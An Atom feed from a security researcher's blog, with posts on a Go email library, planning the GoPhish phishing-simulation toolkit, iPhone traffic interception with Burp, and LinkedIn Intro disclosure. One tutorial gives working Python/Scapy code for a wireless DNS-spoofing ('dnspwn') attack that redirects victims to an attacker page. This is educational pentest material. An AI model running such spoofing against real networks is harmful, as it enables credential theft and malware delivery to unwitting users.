<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[jordan-wright]]></title>
  <link href="http://jordan-wright.github.io/atom.xml" rel="self"/>
  <link href="http://jordan-wright.github.io/"/>
  <updated>2014-01-05T15:20:22-06:00</updated>
  <id>http://jordan-wright.github.io/</id>
  <author>
    <name><![CDATA[Jordan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Building GoPhish - How to Send Email with Go]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go/"/>
    <updated>2014-01-03T22:06:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/go_email.png"/></p>

<h3>Introduction</h3>

<p>I&rsquo;ve been playing around with Go for about a month now, and I&rsquo;ve <em>really</em> grown to like it. After getting used to the syntax and remembering what a pointer is for (thanks, Python), Go has become a favorite language to develop with. I&rsquo;m even using it for the <a href="http://www.matasano.com/articles/crypto-challenges/">Matasano Crypto Challenges</a> (which are <em>awesome</em>).</p>

<p>While the standard library in Go is definitely robust, being a young language, there are a few niceties that aren&rsquo;t yet included. Sending email is one of them. Don&rsquo;t get me wrong, Go has a wonderful <a href="http://golang.org/pkg/net/smtp/">SMTP</a> package, <a href="http://golang.org/pkg/mime/">MIME</a> package, and even a <a href="http://golang.org/pkg/net/mail/">Mail</a> package (which <em>only</em> parses existing email messages). However, there is no library to actually <strong>create</strong> emails in a meaningful way. Since <a href="https://github.com/jordan-wright/gophish">Gophish</a> relies heavily on sending emails, I&rsquo;ve sought to change this. And, after reading more RFC&rsquo;s than I normally prefer, I believe I&rsquo;ve created a package that provides intuitive, robust, and flexible email creation and sending called <a href="https://github.com/jordan-wright/email">email</a>.</p>

<p>Let&rsquo;s see how to use it.</p>

<!--more-->


<h3>How You <em>Normally</em> Send an Email in Go</h3>

<p>To send email in Go, one needs to:</p>

<ul>
<li>Create a byte slice of the email message (conforming to all needed RFC&rsquo;s)</li>
<li>Send this email using the SMTP library</li>
</ul>


<p>The second part is easy, the first part is not. Sure, sending a simple text message may be straight forward, but things get tricky when you want to cover things like supporting HTML and text body types, attaching files, supporting CC and BCC recipients, etc.</p>

<h3>Sending Email Using the <code>email</code> Package</h3>

<p>To make this easier, I have created the <a href="https://github.com/jordan-wright/email"><code>email</code></a> package (full documentation <a href="http://godoc.org/github.com/jordan-wright/email">here</a>). This package allows users to create emails with a variety of options, and send them easily. Examples say more than I can, so here is some code showing how to use the package.</p>

<h4>Installing the Package</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>go get github.com/jordan-wright/email</span></code></pre></td></tr></table></div></figure>


<h4>Creating a New Email</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="s">&quot;github.com/jordan-wright/email&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">e</span> <span class="o">:=</span> <span class="nx">email</span><span class="p">.</span><span class="nx">NewEmail</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Setting the Subject, To, From, Bcc, Cc</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Subject</span> <span class="p">=</span> <span class="s">&quot;Awesome Subject&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">From</span> <span class="p">=</span> <span class="s">&quot;Jordan Wright &lt;test@gmail.com&gt;&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">To</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test@example.com&quot;</span><span class="p">}</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Bcc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_bcc@example.com&quot;</span><span class="p">}</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Cc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_cc@example.com&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Setting the Content (HTML &amp; Text)</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Text</span> <span class="p">=</span> <span class="s">&quot;Text Body is, of course, supported!&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">HTML</span> <span class="p">=</span> <span class="s">&quot;&lt;h1&gt;Fancy Html is supported, too!&lt;/h1&gt;&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Attaching a File</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">AttachFile</span><span class="p">(</span><span class="s">&quot;test.txt&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also use the <a href="http://godoc.org/github.com/jordan-wright/email#Email.Attach"><code>Attach</code></a> function to attach content directly from an io.Reader.</p>

<h4>Sending the Email (Using Gmail as Example)</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Send</span><span class="p">(</span><span class="s">&quot;smtp.gmail.com:587&quot;</span><span class="p">,</span> <span class="nx">smtp</span><span class="p">.</span><span class="nx">PlainAuth</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">,</span> <span class="s">&quot;test@gmail.com&quot;</span><span class="p">,</span> <span class="s">&quot;password123&quot;</span><span class="p">,</span> <span class="s">&quot;smtp.gmail.com&quot;</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Conclusion</h4>

<p>I hope this package will be useful to those that need to send email from their Go projects. I am excited to continue working on Gophish &ndash; you can expect a big update soon! Until then, as always, feel free to leave any questions or comments below.</p>

<p>-Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building Gophish - Day 1]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1/"/>
    <updated>2013-11-29T16:15:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/gophish.png"/></p>

<h3>Introduction</h3>

<p>Since the <a href="http://sptoolkit.com/the_end.php">Simple Phishing Toolkit (SPT)</a> was discontinued, I&rsquo;ve wanted to create a simple, effective, and open-source phishing toolkit. In recent years, we&rsquo;ve seen a rise in spear-phishing attacks targeting large organizations, most of which are largely successful. The goal of this toolkit will be to provide businesses and penetration testers with the ability to quickly and easily perform in-house or contracted phishing engagements, and track the responses to see where improvements can be made. This toolkit will be called <a href="https://github.com/jordan-wright/gophish">gophish</a>.</p>

<p>In addition to this, I&rsquo;ve been casually poking around at <a href="http://golang.org/"><code>go</code></a> for a while now, and have decided it would be good to finally put it to use in a larger project. I&rsquo;m a fan of seeing the steady development and updates of projects as they are created. I believe it can help keep the developer motivated and the users informed and involved, so this is what I&rsquo;m going to do. Hopefully, these posts will allow others to learn alongside me, as well as spur improvements from experienced <code>go</code> developers so that <a href="https://github.com/jordan-wright/gophish">gophish</a> can be the best product possible.</p>

<p>With that being said &ndash; let&rsquo;s get started!</p>

<!--more-->


<h3>Why Go?</h3>

<p>In addition to learning a new language, here are a few reasons why I chose <code>go</code> for this project:</p>

<ul>
<li>Cross-compile binaries by default</li>
<li>Only distribute one binary &ndash; just download and run (no more dependencies!)</li>
<li>Low memory overhead</li>
</ul>


<p>I believe the second point is crucial, in that it makes it <em>dead-simple</em> to get up and running. Existing solutions (such as SPT or <a href="https://github.com/pentestgeek/phishing-frenzy">Phishing Frenzy</a>) require an already running webserver or other framework installation.</p>

<h3>Gophish Requirements</h3>

<p>Here are a few of the things I want to be able to do with gophish:</p>

<ul>
<li>Create &ldquo;campaigns&rdquo;, each of which are a simulation of a phishing attack</li>
<li>Create HTML or text templates for phishing emails, providing as many as possible built-in</li>
<li>Allow users to clone existing sites for use in templates</li>
<li>Allow users to import and group phishing targets easily</li>
<li>Provide intuitive analytics, and allow reports to be exported</li>
<li>If possible, integrate with existing products such as the Social Engineer&rsquo;s Toolkit</li>
</ul>


<h3>Getting Started</h3>

<p>I am <em>tentatively</em> planning on creating a REST API for all backend functionality, so as to allow developers to automate gophish. This will also make it easier to separate front-end logic from the backend.</p>

<p>I have looked around at different <code>go</code> web frameworks, and I am going to start by taking a look at the tools provided in the <a href="http://www.gorillatoolkit.org/">Gorilla toolkit</a>, since they seem to sit on top of the standard <code>net/http</code> library without abstracting too many things away.</p>

<p>That&rsquo;s all I have for now &ndash; stay tuned for progress updates (and a big initial commit)! And, as always, let me know if you have any questions or suggestions in the comments below!</p>

<p>-Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wireless Attacks with Python: Part One - The "Dnspwn Attack"]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/"/>
    <updated>2013-11-15T20:45:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/wireless_python.png"/></p>

<h3>Introduction</h3>

<p>A while back, I <a href="http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html">published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href="http://www.aircrack-ng.org/">aircrack suite</a>.</p>

<p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p>

<!--more-->


<h3>The &ldquo;Dnspwn Attack&rdquo;</h3>

<p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href="http://airpwn.sourceforge.net/Airpwn.html">airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p>

<p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p>

<p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p>

<p>Let&rsquo;s see what this would look like:</p>

<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a></p>

<p>So, now that we know how the attack works, let&rsquo;s automate it!</p>

<h3>Setting up the Alfa AWUS06H</h3>

<p>As was the case in my Raidersec post, we will be using the handy <a href="http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8">Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~# airmon-ng start wlan0</span></code></pre></td></tr></table></div></figure>


<p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p>

<h3>Coding the Attack</h3>

<p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from scapy.all import *
</span><span class='line'>
</span><span class='line'>sniff(prn=lambda x: send_response(x),
</span><span class='line'>  lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p>

<ul>
<li>802.11 Frame &ndash; Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li>
<li>802.11 Frame &ndash; Switch the source and destination MAC addresses</li>
<li>IP Layer &ndash; Switch the source and destination IP addresses</li>
<li>UDP layer &ndash; Switch the source and destination ports</li>
<li>DNS layer &ndash; Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li>
</ul>


<p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def send_response(x):
</span><span class='line'>  # Get the requested domain
</span><span class='line'>  req_domain = x[DNS].qd.qname
</span><span class='line'>  spoofed_ip = '192.168.2.1'
</span><span class='line'>  # Let's build our response from a copy of the original packet
</span><span class='line'>  response = x.copy()
</span><span class='line'>  # We need to start by changing our response to be "from-ds", or from the access point.
</span><span class='line'>  response.FCfield = 2L
</span><span class='line'>  # Switch the MAC addresses
</span><span class='line'>  response.addr1, response.addr2 = x.addr2, x.addr1
</span><span class='line'>  # Switch the IP addresses
</span><span class='line'>  response.src, response.dst = x.dst, x.src
</span><span class='line'>  # Switch the ports
</span><span class='line'>  response.sport, response.dport = x.dport, x.sport
</span><span class='line'>  # Set the DNS flags
</span><span class='line'>  response[DNS].qr = 1L
</span><span class='line'>  response[DNS].ra = 1L
</span><span class='line'>  response[DNS].ancount = 1</span></code></pre></td></tr></table></div></figure>


<p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>response[DNS].an = DNSRR(
</span><span class='line'>  rrname = req_domain,
</span><span class='line'>  type = 'A',
</span><span class='line'>  rclass = 'IN',
</span><span class='line'>  ttl = 900,
</span><span class='line'>  rdata = spoofed_ip
</span><span class='line'>  )</span></code></pre></td></tr></table></div></figure>


<p>And, finally, we inject the spoofed response:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sendp(response)</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s all there is to it! You can find the full source on <a href="https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py">Github</a>.</p>

<h3>Demo</h3>

<p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>  Owned.
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href="http://beefproject.com/">BeEF framework</a>, for example.</p>

<p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p>

<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
<a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a></p>

<h3>Conclusion &amp; Future Improvements</h3>

<p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p>

<ul>
<li>Match requests against regular expressions (for example, only replacing Javascript content)</li>
<li>Set options from arguments / Read configuration information from a file</li>
<li>Implement the attack for other protocols (ie HTTP).</li>
</ul>


<p>Enjoy!</p>

<p>Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Pentest iPhone Apps with Burp]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/"/>
    <updated>2013-11-07T15:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/iphone_burp.png"/></p>

<h3>Introduction</h3>

<p>When looking at the functionality of mobile apps, it&rsquo;s clear that they aren&rsquo;t <em>that</em> different than web applications. They often just serve as a frontend for the data stored on a central backend server or database. As such, if developers aren&rsquo;t careful to protect these apps, many of the <a href="https://www.owasp.org/index.php/Top_10_2013">same vulnerabilities</a> we find in standard web applications (such as injection attacks on unvalidated input) can be exploited by attackers.</p>

<p>This post will show how to setup the iPhone to work with the popular <a href="http://portswigger.net/burp/download.html">Burp Suite</a> so that traffic from apps can be intercepted and tested for vulnerabilities.</p>

<!--more-->


<h3>Getting the CA Certificate from Burp</h3>

<p>First, open up Burp, select the &ldquo;Proxy&rdquo; tab, and select the &ldquo;Options&rdquo; sub-tab. Then, under &ldquo;Proxy-Listeners&rdquo;, highlight the interface and select &ldquo;Edit&rdquo;. Then, open the &ldquo;Certificate&rdquo; sub-tab, and make sure it is set to &ldquo;Generate CA-signed per-host certificate&rdquo;. Since we will install the CA certificate on our iPhone, any certificate signed by Burp will be trusted.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/burp_screen.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/burp_screen.PNG"/></a>
<a href="http://jordan-wright.github.io/images/blog/iphone_burp/burp_settings.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/burp_settings.PNG"/></a></p>

<p>Next, open up a desktop browser and set the proxy settings to use Burp. In this example, I&rsquo;ll use Chrome. Change your settings so that the browser uses Burp as shown below (IP address and port may differ).</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/pc_proxy_settings.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/pc_proxy_settings.PNG"/></a></p>

<p>Then, go to a site using HTTPS (ie: <a href="https://www.google.com">google.com</a>. Once the page comes up, click the icon in the left side of the address bar, select the &ldquo;Certificate&rdquo; sub-tab, and make sure that the certificate is signed by &ldquo;PortSwigger CA&rdquo;.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/export_cert.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/export_cert.png"/></a></p>

<p>Next, click &ldquo;Certificate Information&rdquo;, and select &ldquo;Certification Path&rdquo; in the window that appears.</p>

<p>Highlight the root <strong>PortSwigger CA certificate</strong> and click &ldquo;View Certificate&rdquo;. Then, open up the &ldquo;Details&rdquo; tab and click &ldquo;Copy to File&rdquo;. Follow the Certificate Export wizard, making sure to save the certificate in DER encoded binary X.509 (.CER) format.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/copy_to_file.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/copy_to_file.PNG"/></a></p>

<p>Once the certificate has been exported, we need to get it onto the iPhone. You can email it to yourself and open it in the iPhone, but I just chose to start a simple Python web server so that I could browse to the certificate as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -m SimpleHTTPServer</span></code></pre></td></tr></table></div></figure>


<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/safari.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/safari.PNG"/></a></p>

<p>After opening the certificate link in Safari, the following screen will be presented asking you if you want to install the certificate. Click &ldquo;Install&rdquo;, enter your PIN, and you&rsquo;re all set!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/install_cert.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/install_cert.png"/></a>
<a href="http://jordan-wright.github.io/images/blog/iphone_burp/trusted_cert.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/trusted_cert.PNG"/></a></p>

<h3>Setting the iPhone Proxy Settings</h3>

<p>The last thing you will want to do is to set your iPhone to use the Burp proxy. You can do this by going into your wireless network settings and selecting &ldquo;Manual&rdquo; under &ldquo;HTTP PROXY&rdquo;. Then, just fill in the details!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/ios_proxy_settings.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/ios_proxy_settings.png"/></a></p>

<h3>Testing</h3>

<p>You can test to see if this works by navigating to Google in Safari. If you don&rsquo;t receive an error, and you can intercept the request in Burp, then you&rsquo;re all set!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/success.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/success.PNG"/></a></p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linkedin's Response to My "Phishing with Intro" Post]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post/"/>
    <updated>2013-11-01T17:55:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/linkedin_gift.png"/></p>

<h3>The Initial Post</h3>

<p>I recently published a <a href="http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro/">blog post</a> which showed a practical attack against Linkedin&rsquo;s Intro. The post reached the front page of <a href="http://news.ycombinator.com">Hacker News</a> (a full writeup of my experience with the &ldquo;Hacker News Effect&rdquo; will be posted soon for those interested), which caused the post to gain quite a bit of publicity and traction. Soon after, I was contacted by Linkedin&rsquo;s security team. This was their response.</p>

<!--more-->


<h3>Linkedin&rsquo;s Response</h3>

<p>I was initially contacted via email by David Cintz, a member of Linkedin&rsquo;s security team, wanting to talk with me about the post. While talking with him on the phone, he made it immediately clear that he didn&rsquo;t call to ask me to take down the post &ndash; &ldquo;Linkedin isn&rsquo;t that kind of company&rdquo;. Instead, he simply wanted to see if I would be willing to provide him with any additional information about the vulnerability so that they could provide the most effective fix as soon as possible.</p>

<p>We stayed in contact via phone and email throughout the day, and a hotfix (see the update at the top of the original post) was released in the early evening. I was asked to verify the fix to make sure that it adequately addressed the vulnerability I found. After verifying the fix, the member of the security team told me that he wanted to thank me for my help. He told me that, while they normally don&rsquo;t reward vulnerabilities disclosed without previously notifying them, he appreciated my help and wanted to send me a small token of thanks.</p>

<h3>I&rsquo;ve Got Mail!</h3>

<p>I received the following package today:</p>

<p><a href="http://jordan-wright.github.io/images/blog/phish_response/gift.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/phish_response/gift.png"/></a></p>

<p>Here are the contents:</p>

<ul>
<li>T-Shirt

<ul>
<li>Front: &ldquo;in&#8221;FORMANT</li>
<li>Back: &lt;script&gt;alert(document.cookie);&lt;/script&gt;</li>
<li>Side: security@in</li>
</ul>
</li>
<li>Hand-written letter from David</li>
<li>2 Linkedin stickers</li>
<li>Linkedin-branded &ldquo;2 in 1&rdquo; Tumbler</li>
</ul>


<h3>Conclusion</h3>

<p>While I still believe that the security risks of using Intro will always outweigh the benefits of using it, I do think Linkedin&rsquo;s security team handled the situation very well. They approached the problem quickly and professionally, while going above and beyond to show appreciation for my help. I&rsquo;m a fan of giving credit where it&rsquo;s due and, in this case, Linkedin&rsquo;s security team certainly earned it.</p>

<p>Thanks, Linkedin.</p>

<h3>Full Timeline</h3>

<ul>
<li><em>October 27, 2013</em> &ndash; Blog Post Published</li>
<li><em>October 28, 2013 9:53 AM PDT</em> &ndash; Contacted by Linkedin Security Team</li>
<li><em>October 28, 2013 approx. 2:40 PM PDT</em> &ndash; Hotfix released</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Phishing with Linkedin's Intro]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro/"/>
    <updated>2013-10-26T19:21:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/linkedin_phish.png"/></p>

<p><em>Update 10/28/2013 6:30PM CDT &ndash; I have been in contact with Linkedin&rsquo;s security team and a hotfix has recently been released to address the findings below. This fix applies the styling rules to a randomly generated ID, as opposed to the class based styling seen below. This provides more specificity in applying the rules, making it more difficult to override.</em></p>

<p><em>I am no CSS expert so there could very well be tricks to still get around this and remove the content (or even just hide it and overlap it) &ndash; <a href="http://jordan-wright.github.io/contact">email me</a> if you know of one! I will be continuing my work with Linkedin&rsquo;s security team to iron out any bugs we can find. Users are reminded that no solution is perfect, and that seeing this data in an email in no way definitively proves the senders legitimacy.</em></p>

<p><em>I would also like to thank Linkedin&rsquo;s security team for their quick and effective response to these findings.</em></p>

<h3>&ldquo;Intro&#8221;duction</h3>

<p>On October 23, Linkedin introduced an application called <a href="http://blog.linkedin.com/2013/10/23/announcing-linkedin-intro/">&ldquo;Intro&rdquo;</a>. The premise is simple: allow iPhone users to see details about the people they are emailing within the native iPhone Mail App. Think <a href="http://rapportive.com/">Rapportive</a> for the iPhone Mail App, because that&rsquo;s <em>essentially</em> what this is (and made by the same people).</p>

<p>However, when reading the initial description of Intro, there was one part that caught my eye:</p>

<blockquote><p>David says Crosswise would love to work with you. Is this spam, or the real deal?</p>

<p>With Intro, you can immediately see what David looks like, where he’s based, and what he does. You can see that he’s the CEO of Crosswise. This is the real deal.</p></blockquote>

<p>This is not much different than Linkedin saying &ldquo;we&rsquo;ve put a picture of a lock in your email, so you know for sure it&rsquo;s secure&rdquo;. Linkedin is simply giving its users a false sense of security. In this post, we&rsquo;ll take a look and see what <em>exactly</em> Linkedin is doing to its users&#8217; email, as well as how we can spoof this information, gaining full control of the information shown to the user.</p>

<!-- more -->


<h3>What Linkedin Does to Your Email</h3>

<p>While I am currently performing a much more in-depth analysis of Intro which will give a much better look into its behavior (to be posted soon), for now we will just take a look at the basics of how Intro works, and look specifically into how it manipulates user&rsquo;s email.</p>

